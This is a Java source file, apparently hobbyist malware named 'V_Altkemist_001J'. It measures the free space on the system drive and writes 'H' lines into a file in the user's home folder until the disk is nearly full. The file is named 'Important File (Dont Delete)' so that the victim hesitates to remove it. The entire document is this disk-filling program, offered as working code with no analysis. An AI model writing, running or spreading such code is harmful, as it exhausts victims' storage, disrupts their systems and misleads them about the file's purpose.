/**
 * @(#)V_Altkemist_001J.java
 * @author Altkemist
 * @version 1.00 2016/6/1
 */
import java.io.*;
class ConvertToFreeSpace{
	private long result, needed;
	void setneeded(long freeS){
		needed=freeS;
	}
	void setiterator(){
		result=needed/3;
	}
	long getIterator(){
		return result;
	}
}
public class V_Altkemist_001J {
    public static void main(String[] args) throws IOException{
       	String user = System.getProperty ("user.home");
       	ConvertToFreeSpace c = new ConvertToFreeSpace ();
       	File f;
       	if (System.getProperty("os.name").indexOf("Windows")!=-1)
       		f = new File ("C:");
       	else
       		f = new File ("/");
       		
       	System.out.println (f);
       	
       	long freeS = f.getFreeSpace(), iterator=1;
       	
       	c.setneeded(freeS);
       	c.setiterator();
       	System.out.println (freeS + " bytes");
       	PrintWriter w = new PrintWriter (user +"\\Important File (Dont Delete)","UTF-8");
       	
       	long limit = c.getIterator();
       	while (iterator<limit){
       		w.println ("H");
       		iterator++;
       	}
       	
       	w.close();
       	System.out.println ("Closing...");
    }
}

// H 1 = 3 bytes
